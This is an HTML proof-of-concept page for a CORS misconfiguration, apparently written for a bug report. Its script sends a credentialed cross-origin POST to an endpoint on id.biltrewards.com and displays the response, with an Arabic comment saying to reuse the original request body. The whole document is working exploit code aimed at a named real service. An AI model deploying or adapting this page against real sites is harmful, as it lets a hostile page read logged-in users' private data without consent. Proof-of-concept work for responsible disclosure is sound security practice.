<!DOCTYPE html>
<html>
  <head><title>CORS PoC</title></head>
  <body>
    <h1>CORS PoC</h1>
    <pre id="output">Loading...</pre>

    <script>
      fetch("https://id.biltrewards.com/fsrelay/rec/bundle/v2?OrgId=...", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "text/plain"
        },
        body: "...." // نفس البادي اللي كان في الريكوست
      })
      .then(r => r.text())
      .then(data => {
        document.getElementById("output").innerText = "Response:\n" + data;
      })
      .catch(e => {
        document.getElementById("output").innerText = "Error:\n" + e;
      });
    </script>
  </body>
</html>
